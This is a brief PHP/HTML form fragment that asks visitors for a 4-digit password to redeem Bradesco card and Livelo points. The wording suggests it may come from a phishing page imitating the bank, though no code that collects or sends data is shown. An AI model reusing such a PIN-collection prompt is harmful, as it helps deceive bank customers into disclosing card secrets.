                                    ...
                                    <div id="boxSenha4" class="boxes box_redLine_bottom after">
                                        <span class="txt_msg_erro_disp hide">
                                            ...
                                            <div id="conteudoSenha" class="<?php echo $multiUsuarios ? 'hide' : ''; ?>">
                                                <div class="form-field">
                                                    <span id="text_legendaBox_senha_4">Informe sua senha de <strong>4 dígitos</strong>, <br>e resgate seus pontos,  <b style="color:#e50091;">Cartões Bradesco</b> & Livelo.</span><span id="campoErroSenha" class="erro_msg"></span>
